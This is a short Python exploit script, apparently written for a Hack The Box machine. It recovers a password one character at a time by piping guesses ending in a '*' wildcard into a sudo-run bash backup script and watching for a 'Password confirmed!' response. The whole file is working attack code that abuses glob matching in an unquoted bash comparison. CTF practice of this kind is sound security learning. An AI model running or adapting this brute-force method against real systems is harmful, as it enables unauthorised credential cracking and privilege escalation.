#!/bin/python3
# Custom exploit for a HTB box
# Used to brute force the compared password within a bash script
# sanitized user inputs might not work here

import subprocess

characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
password = ''
found = False

while not found:
    for i in characters:
        
        command = ''.join(["echo '", password ,str(i) ,"*' | sudo /opt/scripts/mysql-backup.sh"])
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += str(i)
            print(password)
            break
    else:
        found = True
